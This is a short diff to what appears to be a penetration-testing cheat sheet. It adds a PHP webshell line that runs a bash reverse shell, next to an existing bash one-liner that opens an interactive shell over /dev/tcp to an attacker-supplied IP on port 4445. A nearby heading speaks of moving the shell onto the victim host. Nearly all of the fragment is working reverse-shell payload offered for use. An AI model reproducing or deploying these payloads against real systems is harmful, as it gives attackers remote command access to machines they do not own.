@@ -20,6 +20,10 @@ Oneliner for webshells
 ```
 bash -c "bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4445 0>&1"
 ```
+PHP version
+```
+<?pHp exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4445 0>&1'"); ?>
+```
 
 ## Transfer the shell to the victim host
 Assuming we have a basic webshell
